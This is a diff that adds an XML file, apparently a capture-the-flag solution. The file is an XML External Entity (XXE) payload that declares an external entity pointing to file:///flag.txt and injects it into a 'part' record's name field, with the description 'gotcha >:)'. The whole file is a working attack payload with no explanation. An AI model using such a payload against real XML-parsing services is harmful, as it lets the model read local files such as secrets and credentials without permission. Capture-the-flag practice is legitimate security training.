@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE parts [
+<!ELEMENT parts ANY >
+<!ELEMENT part ANY >
+<!ELEMENT name ANY >
+<!ELEMENT author ANY >
+<!ELEMENT image ANY >
+<!ELEMENT description ANY >
+<!ENTITY the_flag SYSTEM "file:///flag.txt" >
+]>
+<part>
+  <name>&the_flag;</name>
+  <author>me</author>
+  <image>no-thanks.png</image>
+  <description>gotcha >:)</description>
+</part>
